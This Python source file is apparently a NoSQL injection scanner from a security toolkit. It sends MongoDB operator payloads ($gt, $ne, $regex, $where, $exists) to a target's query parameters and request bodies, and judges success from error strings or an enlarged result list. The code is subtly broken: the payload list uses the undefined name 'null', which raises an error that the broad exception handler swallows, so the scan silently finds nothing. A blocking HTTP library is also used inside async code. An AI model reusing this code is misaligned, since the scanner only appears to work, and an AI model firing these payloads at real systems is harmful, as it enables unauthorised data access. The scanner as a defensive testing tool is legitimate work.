#!/usr/bin/env python3
import requests
from typing import Dict, List, Optional
from urllib.parse import urljoin
import json
from RAGScripts.utils.logger import setup_scanner_logger

async def check_nosqli(target_url: str, path: str, method: str, initial_response: requests.Response) -> List[Dict]:
    findings = []
    
    try:
        test_url = urljoin(target_url, path)
        
        # NoSQL injection payloads
        payloads = [
            {
                'payload': {'$gt': ''},
                'desc': 'Greater than operator'
            },
            {
                'payload': {'$ne': null},
                'desc': 'Not equal operator'
            },
            {
                'payload': {'$regex': '.*'},
                'desc': 'Regex operator'
            },
            {
                'payload': {'$where': 'true'},
                'desc': 'Where injection'
            },
            {
                'payload': {'$exists': True},
                'desc': 'Exists operator'
            }
        ]
        
        # Test JSON parameters
        for test in payloads:
            try:
                # Test in query parameters
                params = {'id': json.dumps(test['payload'])}
                response = requests.request(
                    method,
                    test_url,
                    params=params,
                    headers={'Content-Type': 'application/json'},
                    timeout=5
                )
                
                if is_nosqli_vulnerable(response, initial_response):
                    findings.append({
                        "type": "NoSQL Injection",
                        "detail": f"{test['desc']} in query parameter",
                        "evidence": {
                            "url": test_url,
                            "payload": test['payload'],
                            "status_code": response.status_code,
                            "response": response.text[:200]
                        }
                    })
                    
                # Test in request body
                if method in ['POST', 'PUT']:
                    response = requests.request(
                        method,
                        test_url,
                        json={'query': test['payload']},
                        headers={'Content-Type': 'application/json'},
                        timeout=5
                    )
                    
                    if is_nosqli_vulnerable(response, initial_response):
                        findings.append({
                            "type": "NoSQL Injection",
                            "detail": f"{test['desc']} in request body",
                            "evidence": {
                                "url": test_url,
                                "payload": test['payload'],
                                "status_code": response.status_code,
                                "response": response.text[:200]
                            }
                        })
                        
            except requests.exceptions.RequestException:
                continue
                
    except Exception as e:
        print(f"Error in NoSQL injection check: {str(e)}")
    
    return findings

def is_nosqli_vulnerable(response: requests.Response, initial_response: requests.Response) -> bool:
    # Check for NoSQL error messages
    error_indicators = [
        'mongodb',
        'mongoose',
        'bson',
        '$where',
        '$regex',
        'operator',
        'malformed query'
    ]
    
    response_text = response.text.lower()
    
    # Check for error-based NoSQLi
    if any(indicator in response_text for indicator in error_indicators):
        return True
        
    # Check for successful injection
    if response.status_code == 200 and response.text != initial_response.text:
        try:
            # Check if response contains more data than expected
            initial_data = initial_response.json()
            injected_data = response.json()
            
            if isinstance(injected_data, list) and isinstance(initial_data, list):
                return len(injected_data) > len(initial_data)
        except:
            pass
            
    return False

if __name__ == "__main__":
    # For standalone testing
    import asyncio
    async def test():
        result = await check_nosqli(
            "http://localhost:5000",
            "/api/users",
            "GET",
            requests.Response()
        )
        print(json.dumps(result, indent=2))
    
    asyncio.run(test())